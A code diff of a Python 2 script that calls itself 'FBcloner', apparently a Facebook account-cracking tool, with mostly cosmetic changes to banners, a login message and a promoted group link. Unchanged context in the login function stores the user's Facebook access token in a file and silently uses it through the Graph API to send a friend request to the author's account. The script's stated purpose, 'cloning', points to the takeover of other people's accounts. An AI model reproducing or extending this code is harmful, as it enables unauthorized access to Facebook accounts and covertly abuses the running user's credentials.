@@ -57,7 +57,7 @@ logo = """
 \033[1;96m    ____) | (_| |   <| | | | (_| |\ V  V / (_| | |_ 
 \033[1;92m   |_____/ \__,_|_|\_\_| |_|\__,_| \_/\_/ \__,_|\__|
                                                   
-\033[1;93m      Facebook : www.facebook.com/cyberzone360    
+\033[1;93m      Facebook : www.facebook.com/groups/cyberzone360    
 \033[1;93m      YouTube  : TiPS&TRiCKS 360
 \033[1;96m ♦♦♦================================================♦♦♦
 """
@@ -81,7 +81,7 @@ print  """
 
 \033[1;96m╭━━━┳━━╮ ╭━━━╮
 \033[1;96m┃╭━━┫╭╮┃ ┃╭━╮┃
-\033[1;96m┃╰━━┫╰╯╰╮┃┃/╰╋━┳━━┳╮╭┳━━╮╭╮
+\033[1;96m┃╰━━┫╰╯╰╮┃┃ ╰╋━┳━━┳╮╭┳━━╮╭╮
 \033[1;96m┃╭━━┫╭━╮┃┃┃╭━┫╭┫╭╮┃┃┃┃╭╮┃╰╯
 \033[1;96m┃┃ ╱┃╰━╯┃┃╰┻━┃┃┃╰╯┃╰╯┃╰╯┃╭╮
 \033[1;96m╰╯. ╰━━━╯╰━━━┻╯╰━━┻━━┫╭━╯╰╯
@@ -180,8 +180,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
+				print '\n\x1b[1;36;40m[✓] Login Successful.Please join our FB Group(Cyber Zone)...'
+				os.system('xdg-open https://facebook.com/groups/cyberzone360/')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -341,7 +341,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('    \033[1;97mFBcloner started cloning please Wait...')
+	jalan('      \033[1;97mFBcloner started cloning please wait....')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
